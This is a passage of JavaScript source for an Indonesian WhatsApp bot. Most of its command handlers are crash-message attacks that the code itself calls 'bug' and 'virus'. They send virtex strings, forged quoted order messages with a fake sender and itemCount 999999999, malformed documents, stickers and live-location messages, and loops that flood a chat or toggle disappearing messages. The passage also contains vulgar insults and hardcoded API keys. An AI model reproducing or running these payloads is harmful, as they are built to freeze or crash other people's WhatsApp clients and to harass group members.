          { buttonId: `${prefix}xixi`, buttonText: { displayText: 'KONTOL BAPAK KAU PECAH' }, type: 1 }
        ]
        sendButImage(from, menunya, teks, gambar, but)
break
case 'bugneon': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Teks`)
					bugve = args.join(" ")
					reply('Tunggu')
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${bugve}&theme=neon&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.url)
					kurzxd.sendMessage(from, buffer1, image, {thumbnail: virgam, quoted: kurz, caption: `${bugve}\n\nDone`})
					break
case 'bugnulis':
if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} kurzxd*`)
                   F = body.slice(7)
                   reply(`Sbntr`)
                   anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/foliokiri?text=${F}&apikey=hardianto`)
                   kurzxd.sendMessage(from, anu, image, {thumbnail: virgam, caption: `Nih Ngabbbbbb `, quoted: kurz})
                   break
case 'spamvirtex':
if (!kurz.key.fromMe && !isOwner) return
					if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
await kurzxd.sendMessage(from, spamvirtex, text)
}
break
case 'hen':
if (!kurz.key.fromMe) return reply('Lu siapa')
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await kurzxd.toggleDisappearingMessages(from,`MODAR`,text)
lzain = ` ⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄ ‏⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤ ‏⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿ ‏⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄ ‏⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶ ‏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿ ‏⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ‏⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿ ‏⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿ ‏⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿ ‏⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿ ‏⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛ ‏⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄ ‏⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄..
`
kurzxd.sendMessage(from, lzain, text, {thumbnail: fs.readFileSync(`lib/logo.jpg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`lib/logo.jpg`),"itemCount":-999999999,"status":"INQUIRY","surface":"CATALOG","message":` 💫BODY-BOT⚡ `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
await kurzxd.toggleDisappearingMessages(from,`HACKINGBYkurzxd999999`,text)
kurzxd.toggleDisappearingMessages(from,`${virtexbykurzxd}`,text)
break
case 'bugvideov2':             
if (!isOwner && !kurz.key.fromMe) return
bugvideo = fs.readFileSync('./hm/gif.mp4')
kurzxd.sendMessage(from, bugvideo, video, {thumbnail: virgam,  quoted: kurz, mimetype: 'video/mp4' })
break
case 'bugvideo':             
if (!isOwner && !kurz.key.fromMe) return
bugvideo = fs.readFileSync('./hm/gif.mp4')
kurzxd.sendMessage(from, bugvideo, video, { quoted: kurz, thumbnail: virgam, videoname:`ꪶ𖣂ꫂ ${virtexbykurzxd}.${virtexbykurzxd}`, mimetype: 'video/mp4' })
break
case 'jadivirus':
            if ((isMedia && !kurz.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(kurz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kurz
            file = await kurzxd.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await kurzxd.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: kurz
            }
            ini_buffer = fs.readFileSync(file)
               kurzxd.sendMessage(from, ini_buffer, sticker, { thumbnail : virgam, ftokoo})
            fs.unlinkSync(file)
            } else if ((isMedia && !kurz.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kurz
            file = await kurzxd.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await kurzxd.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: kurz
            }
            ini_buffer = fs.readFileSync(file)
            kurzxd.sendMessage(from, ini_buffer, image, { thumbnail : virgam, ftokoo, options})
            fs.unlinkSync(file)
        } else if ((isMedia && !kurz.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(kurz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kurz
            file = await kurzxd.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await kurzxd.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: kurz
            }
            ini_buffer = fs.readFileSync(file)
               kurzxd.sendMessage(from, ini_buffer, audio, { thumbnail : virgam, ftokoo})
            fs.unlinkSync(file)
        }  else if ((isMedia && !kurz.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(kurz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kurz
            file = await kurzxd.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await kurzxd.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: kurz
            }
            ini_buffer = fs.readFileSync(file)
          kurzxd.sendMessage(from, ini_buffer, video, { thumbnail : virgam, ftokoo})
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/video dengan caption ${prefix}jadivirus`)
        }
        break
case 'kurzxddgx':
if (!kurz.key.fromMe) return reply('Lu siapa')
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await kurzxd.toggleDisappearingMessages(from, 0)
kurzxd.sendMessage(from, spamvirtex, text)
kurzxd.sendMessage(from, virtex2(prefix), text)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await kurzxd.toggleDisappearingMessages(from, 0)
kurzxd.sendMessage(from, spamvirtex, text)
kurzxd.sendMessage(from, virtex2(prefix), text)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await kurzxd.toggleDisappearingMessages(from, 0)
kurzxd.sendMessage(from, spamvirtex, text)
kurzxd.sendMessage(from, virtex2(prefix), text)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await kurzxd.toggleDisappearingMessages(from, 0)
kurzxd.sendMessage(from, spamvirtex, text)
kurzxd.sendMessage(from, virtex2(prefix), text)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await kurzxd.toggleDisappearingMessages(from, 0)
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
                  break
  case 'buggif': 
				          case 'gif':
const nicko = fs.readFileSync('./hm/gif.gif')
					kurzxd.sendMessage(from,nicko,video, {mimetype: Mimetype.gif,caption: virtex9(prefix), thumbnail: virgam,quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				}) 
					break
break
case 'bugdokumen':
if (!kurz.key.fromMe && !isOwner) return
tapib1 = fs.readFileSync('./hm/yamete.mp3')
kurzxd.sendMessage(from, tapib1, document, { quoted: makanya, filename:`DONTOL 🎭 V1 ${virtex2}.document`, mimetype: 'audio/application' })
reply('⏤͟͟͞͞Mampus Bg 🎭')
break
case 'bugdokumenv2':
if (!kurz.key.fromMe && !isOwner) return
tapib1 = fs.readFileSync('./hm/yamete.mp3')
kurzxd.sendMessage(from, tapib1, document, { quoted: makanya, filename:`DONTOL V2 🎭 ${emoji2}.document`, mimetype: 'audio/application' })
reply('⏤͟͟͞͞Mampus Lu Kkkkk 🎭')
break
case 'jadivirgamv2':
 if (!isQuotedImage) return reply('Reply gambarnya!')
			if ((isMedia || isQuotedImage ) && args.length == 0) 
            ger = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
            media = await kurzxd.downloadAndSaveMediaMessage(ger)
            kurzxd.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgamv2})
break
case 'jadivirgamv3':
 if (!isQuotedImage) return reply('Reply gambarnya!')
			if ((isMedia || isQuotedImage ) && args.length == 0) 
            ger = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
            media = await kurzxd.downloadAndSaveMediaMessage(ger)
            kurzxd.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgamv3})
break
case 'bugtagall':
                if (!kurz.key.fromMe) return reply('Lu siapa')
if (!kurz.key.fromMe & !isOwner) return reply(mess.only.admin)
if(!q) return reply('Ingfonya apa?')
if (!isGroup) return reply(mess.only.group)
var nom = kurz.participant
members_id = []
	teks = '\n'
	for (let mem of groupMembers) {
	teks += `┣ *▢*   @${mem.jid.split('@')[0]}\n`
	members_id.push(mem.jid)
	}
mentions(`${q}. *KONTOL LODON    ${q} ${xixi} ${jadivirtex1}`+teks+`┗━ *「 ${namaowner} 」* `, members_id, false)
break
case 'tovirgam':
 if (!isQuotedSticker) return reply('Reply Sticker!')
			if ((isMedia || isQuotedSticker ) && args.length == 0) 
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
            media = await kurzxd.downloadAndSaveMediaMessage(ger)
            kurzxd.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgam})
break
case 'tovirgamv2':
 if (!isQuotedSticker) return reply('Reply Sticker!')
			if ((isMedia || isQuotedSticker ) && args.length == 0) 
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
            media = await kurzxd.downloadAndSaveMediaMessage(ger)
            kurzxd.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgamv2})
break
case 'tovirgamv3':
 if (!isQuotedSticker) return reply('Reply Sticker!')
			if ((isMedia || isQuotedSticker ) && args.length == 0) 
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
            media = await kurzxd.downloadAndSaveMediaMessage(ger)
            kurzxd.sendMessage(from, fs.readFileSync(media), image, {thumbnail: virgamv3})
break
case 'jadicgb':
   if (!q) return reply(`Teks?`)
 if ((isMedia && !kurz.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = await kurzxd.prepareMessageFromContent(from,{
     "productMessage": {
         "product": {
             "productImage": imeg,
             "title": `${q}                                                                                 ${spamvirtex}`,
             "description": `${virgb} ${virgb} `,
             "retailerId": "kurzxd",
         },
         "businessOwnerJid": "62853338317160@s.whatsapp.net",
         "contextInfo": {
            "forwardingScore": 0,
            "isForwarded": false
        }
    }
}, {quoted: kurz, thumbnail: virgam, contextInfo:{}})
   kurzxd.relayWAMessage(res)
}
break
case 'toimg': 
											reply(mess.wait)
									if (!isQuotedSticker) return reply('Reply stiker Lord')
									if ((isMedia && !kurz.message.videoMessage || isQuotedImage || isQuotedSticker && args.length == 0)) {
										encmedia = JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await kurzxd.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.png')
										exec(`ffmpeg -i ${media} ${ran}`, (err) => {
											fs.unlinkSync(media)
											if (err) return reply('❎ Gagal, pada saat mengkonversi sticker ke gambar ❎')
											buffer = fs.readFileSync(ran)
											kurzxd.sendMessage(from, buffer, image, {caption:'Sukses Lord',quoted:kurz})
											fs.unlinkSync(ran)
											})
										} else {
											reply(`Reply Stiker Nya Lord`)
										}
									break
          	case 'jadivirgam':
 if (!kurz.key.fromMe && !isOwner) return
if (!isQuotedImage) return reply('Reply gambarnya!')
			if ((isMedia || isQuotedImage ) && args.length == 0) 
            ger = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
            media = await kurzxd.downloadAndSaveMediaMessage(ger)
            kurzxd.sendMessage(from, fs.readFileSync(media), image, {thumbnail: fs.readFileSync("./database/pirtek/kurzxd.jpeg")})
break
case 'bugpc':
					if (!kurz.key.fromMe) return reply(mess.owner)
buf = fs.readFileSync('./database/media/gambar.jpg')
imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
jk = await kurzxd.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "6288224859350-1624969639@g.us",
"inviteCode": "h+64P9RhJDzgXSPf",
"inviteExpiration": "1625338378",
"groupName": `kurzxd                                  ${vapi}`,
"jpegThumbnail": fs.readFileSync('./database/media/gambar.jpg')
}
}, {quoted:imeu, contextInfo:{}})
kurzxd.relayWAMessage(jk)
await setTimeout(() => {
reply('kurzxd     ')
}, 3000)
break
case 'bgc':
				case 'buggc':
        if (!isOwner && !kurz.key.fromMe) return reply('Skip lu bukan owner !!')
					if (args.length < 1) return reply('Total?')
					for (let i = 0; i < args[0]; i++) {
					await kurzxd.toggleDisappearingMessages(from, 0)
					}
					reply('Udah kirim sebanyak '+args.join(' '))
        break
case 'bugsticker':
if (!kurz.key.fromMe && !isOwner) return
res = await kurzxd.prepareMessageFromContent(from,{
	"stickerMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Ar3J73JZWDkALd78sCqG3MhOl8e5O4mLrCB_c83IrW2z.enc",
						"fileSha256": "k1MG4Nx8T0C1H8PBwT7Me9yEhjHksd8tdSl6H6N/TF0=",
						"fileEncSha256": "GEyPQzx5ejVaConK5p5Bm+g/gBULXrSTgjAaFriudfI=",
						"mediaKey": "RalS1uKVh3ysv5aMCDHMqJ9osXF4O3ORlCdn9HsF5xY=",
						"mimetype": "image/webp",
						"sendEphemeral": true,
					    "thumbnail": fs.readFileSync('./database/pirtek/kurzxd.jpeg'),
						"directPath": "/v/t62.15575-24/12155350_3800086346757642_2527437135372892402_n.enc?ccb=11-4&oh=22c0ea4d51336ce9774713b472e40d90&oe=616F20BC",
						"fileLength": "350946",
						"mediaKeyTimestamp": "1632135185",
						"isAnimated": true
}
}, {quoted:kurz, contextInfo:{}}) 
kurzxd.relayWAMessage(res)
break
case 'katalog':
	  if (!kurz.key.fromMe && !isOwner) return
    hmm4 = fs.readFileSync(`./logo.jpg`)
imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', hmm4, image)

imeg = imeu.message.imageMessage
res = await kurzxd.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": ngazap(prefix),
"description": emoji2(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "62853393885127@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  kurzxd.relayWAMessage(res)
  break
  case 'katalogv2':
  if (!kurz.key.fromMe && !isOwner) return
    hmm3 = fs.readFileSync(`./src/catalog2.jpg`)
imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', hmm3, image)

imeg = imeu.message.imageMessage
res = await kurzxd.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": katalog(prefix),
"description": emoji2(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "62853393885127@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  kurzxd.relayWAMessage(res)
  break
  case 'attp': 
                   if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(' ')
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    await kurzxd.sendMessage(from, ini_buffer, sticker, { quoted: kurz})
                    break   
					case 'sendallvirtex':
					if (!kurz.key.fromMe && !isOwner) return
kurzxd.sendMessage(from, emoji2(prefix), text)
kurzxd.sendMessage(from, virtex(prefix), text)
kurzxd.sendMessage(from, virtex2(prefix), text)
kurzxd.sendMessage(from, virtex3(prefix), text)
kurzxd.sendMessage(from, virtex4(prefix), text)
kurzxd.sendMessage(from, virtex5(prefix), text)
kurzxd.sendMessage(from, virtex6(prefix), text)
kurzxd.sendMessage(from, virtex7(prefix), text)
kurzxd.sendMessage(from, virtex8(prefix), text)
kurzxd.sendMessage(from, virtex9(prefix), text)
kurzxd.sendMessage(from, virtag(prefix), text)
break
         case 'bug':
if (!kurz.key.fromMe && !isOwner) return
					if (args.length < 1) return reply('Jumlah?')
				 for (let i = 0; i < args[0]; i++) {
await kurzxd.toggleDisappearingMessages(from, 0)
}
sendFakeStatus(from, 'Berhasil Mengirim Bug Aja '+args.join(' '), fake)
         break
         case 'sound1':
         const sound1 = fs.readFileSync('audio/sound1.mp3')
         kurzxd.sendMessage(from, sound1, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound2':
         const suu = fs.readFileSync('audio/sound2.mp3')
         kurzxd.sendMessage(from, suu, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: -2, ptt:true})
         break
         case 'sound3':
         const sound3 = fs.readFileSync('audio/sound3.mp3')
         kurzxd.sendMessage(from, sound3, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound4':
         const sound4 = fs.readFileSync('audio/sound4.mp3')
         kurzxd.sendMessage(from, sound4, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound5':
         const sound5 = fs.readFileSync('audio/sound5.mp3')
         kurzxd.sendMessage(from, sound5, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound6':
         const sound6 = fs.readFileSync('audio/sound6.mp3')
         kurzxd.sendMessage(from, sound6, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound7':
         const sound7 = fs.readFileSync('audio/sound7.mp3')
         kurzxd.sendMessage(from, sound7, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
case 'stickermeme': case 'memesticker': case 'memestick': case 'stickmeme': case 'stcmeme': case 'smeme':
													try {
										if (!q) return reply(`${prefix+command} kurzxd Botz`)
										var bawah = q.replace('', '_').replace('\n','%5Cn').replace('?', '~q').replace('%', '~p').replace('&', '~a').replace('#', '~h').replace('/', '~s')
										if (isImage || isQuotedImage) {
											reply(mess.wait)
											var imgbb = require('imgbb-uploader')
											let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kurz
											let media = await kurzxd.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
											var tolink = await imgbb("3b8594f4cb11895f4084291bc655e510", media)
											var sticknye = `https://api.memegen.link/images/custom/-/${bawah}.png?background=${tolink.display_url}`
											var short = await axios.get('https://tinyurl.com/api-create.php?url=' + sticknye)
											var anuu = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=${short.data}`)
											fs.writeFileSync('./sticker/smemek.webp', anuu)
											exec(`webpmux -set exif ./sticker/data.exif ./sticker/smemek.webp -o ./sticker/smemek.webp`, async (error) => {
												if (error) return reply(mess.error)
												kurzxd.sendMessage(from, fs.readFileSync(`./sticker/smemek.webp`), sticker, { quoted: kurz })
												})
												} else if (isQuotedSticker){
													reply(mess.wait)
													var imgbb = require('imgbb-uploader')
													let encmedia = JSON.parse(JSON.stringify(kurz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
													let media = await kurzxd.downloadAndSaveMediaMessage(encmedia)
													let ran = getRandom('.png')
													exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
														fs.unlinkSync(media)
														if (err) return reply('Error')
														var tolink = await imgbb("3b8594f4cb11895f4084291bc655e510", ran)
														var sticknye = `https://api.memegen.link/images/custom/-/${bawah}.png?background=${tolink.display_url}`
														var short = await axios.get('https://tinyurl.com/api-create.php?url=' + sticknye)
														var anuu = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=${short.data}`)
														fs.writeFileSync('./sticker/smemek.webp', anuu)
														exec(`webpmux -set exif ./sticker/data.exif ./sticker/smemek.webp -o ./sticker/smemek.webp`, async (error) => {
															if (error) return reply(mess.error)
															kurzxd.sendMessage(from, fs.readFileSync(`./sticker/smemek.webp`), sticker, { quoted: kurz })
															fs.unlinkSync(ran)
															})
														})
														} else {
															reply(`Reply gambar atau sticker dengan Caption ${prefix+command} teks`)
															}
														} catch (e) {
															return reply(`${e}`)
															console.log(e)
														}
													break
         case 'sound8':
         const sound8 = fs.readFileSync('audio/sound8.mp3')
         kurzxd.sendMessage(from, sound8, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound9':
         const sound9 = fs.readFileSync('audio/sound9.mp3')
         kurzxd.sendMessage(from, sound9, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound10':
         const sound10 = fs.readFileSync('audio/sound10.mp3')
         kurzxd.sendMessage(from, sound10, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound11':
         const sound11 = fs.readFileSync('audio/sound11.mp3')
         kurzxd.sendMessage(from, sound11, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound12':
         const sound12 = fs.readFileSync('audio/sound12.mp3')
         kurzxd.sendMessage(from, sound12, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound13':
         const sound13 = fs.readFileSync('audio/sound13.mp3')
         kurzxd.sendMessage(from, sound13, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound14':
         const sound14 = fs.readFileSync('audio/sound14.mp3')
         kurzxd.sendMessage(from, sound14, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound15':
         const sound15 = fs.readFileSync('audio/sound15.mp3')
         kurzxd.sendMessage(from, sound15, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound16':
         const sound16 = fs.readFileSync('audio/sound16.mp3')
         kurzxd.sendMessage(from, sound16, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound17':
         const sound17 = fs.readFileSync('audio/sound17.mp3')
         kurzxd.sendMessage(from, sound17, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound18':
         const sound18 = fs.readFileSync('audio/sound18.mp3')
         kurzxd.sendMessage(from, sound18, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound19':
         const sound19 = fs.readFileSync('audio/sound19.mp3')
         kurzxd.sendMessage(from, sound19, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound20':
         const sound20 = fs.readFileSync('audio/sound20.mp3')
         kurzxd.sendMessage(from, sound20, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound21':
         const sound21 = fs.readFileSync('audio/sound21.mp3')
         kurzxd.sendMessage(from, sound21, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
case 'bugliveloc':            
if (!kurz.key.fromMe) return reply('Lu siapa')
            res = await kurzxd.prepareMessageFromContent(from,{
				"liveLocationMessage": {
						"degreesLatitude": 34.0184,
						"degreesLongitude": -118.411,
						"caption": `${spamvirtex}`,
						"sequenceNumber": "1632077323798001",
					"thumbnail": thumb,
    "contextInfo": {
      "forwardingScore": 3,
      "isForwarded": false
    }
  }
}, {quoted:ftroli, contextInfo:{}}) 
kurzxd.relayWAMessage(res)
break
         case 'sound22':
         const sound22 = fs.readFileSync('audio/sound22.mp3')
         kurzxd.sendMessage(from, sound22, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound23':
         const sound23 = fs.readFileSync('audio/sound23.mp3')
         kurzxd.sendMessage(from, sound23, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound24':
         const sound24 = fs.readFileSync('audio/sound24.mp3')
         kurzxd.sendMessage(from, sound24, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound25':
         const sound25 = fs.readFileSync('audio/sound25.mp3')
         kurzxd.sendMessage(from, sound25, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
case 'bugarawareal':
if (!kurz.key.fromMe && !isOwner) return
virus = fs.readFileSync('./src/arawa.txt')
kurzxd.sendMessage(from, virus, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxd️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } , mimetype: 'application/txt'})
break
case 'bugarawa':
				case 'arawa':
         if (!kurz.key.fromMe && !isOwner) return
arawa = fs.readFileSync('./src/arawa.txt')
kurzxd.sendMessage(from, arawa, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxd️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${virtexbykurzxd} ${virtexctlgg}.${coba}`, mimetype: 'application/txt'})
break
case 'bugarawaza':
         if (!kurz.key.fromMe && !isOwner) return
arawa = fs.readFileSync('./src/arawa.txt')
kurzxd.sendMessage(from, arawa, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
